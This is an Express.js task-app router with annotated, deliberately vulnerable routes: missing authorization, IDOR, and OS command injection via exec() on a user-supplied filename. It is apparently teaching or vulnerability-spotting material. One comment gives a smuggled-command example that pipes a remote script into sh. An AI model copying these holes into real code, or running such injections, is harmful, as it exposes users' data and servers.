const express = require('express');
const { exec } = require('child_process');
const Task = require('../models/Task');
const requireAuth = require('../middleware/auth');

const router = express.Router();

// Create task — protected, this one's fine
router.post('/', requireAuth, async (req, res) => {
  const { title, description } = req.body;
  const task = await Task.create({ title, description, owner: req.user.id });
  res.status(201).json(task);
});

// VULN (CWE-862: missing authorization): GET /:id has no requireAuth at all,
// and doesn't check that req.user owns the task even if it did — any
// unauthenticated caller can read any task by guessing/incrementing IDs (IDOR).
router.get('/:id', async (req, res) => {
  const task = await Task.findById(req.params.id);
  if (!task) return res.status(404).json({ message: 'Not found' });
  res.json(task);
});

// List all tasks for a given userId in the URL — VULN (CWE-639: IDOR):
// there's no check that the requester IS that user, so any logged-in user
// can read anyone else's tasks by changing the :userId param.
router.get('/user/:userId', requireAuth, async (req, res) => {
  const tasks = await Task.find({ owner: req.params.userId });
  res.json(tasks);
});

// "Export tasks as text file" feature — VULN (CWE-78: OS command injection).
// The filename comes straight from user input into a shell command.
router.post('/export', requireAuth, (req, res) => {
  const { filename } = req.body; // e.g. attacker sends: "notes; curl evil.sh | sh"
  exec(`echo "Task export" > /tmp/${filename}.txt`, (err, stdout, stderr) => {
    if (err) return res.status(500).json({ error: stderr });
    res.json({ message: `Exported to /tmp/${filename}.txt` });
  });
});

module.exports = router;
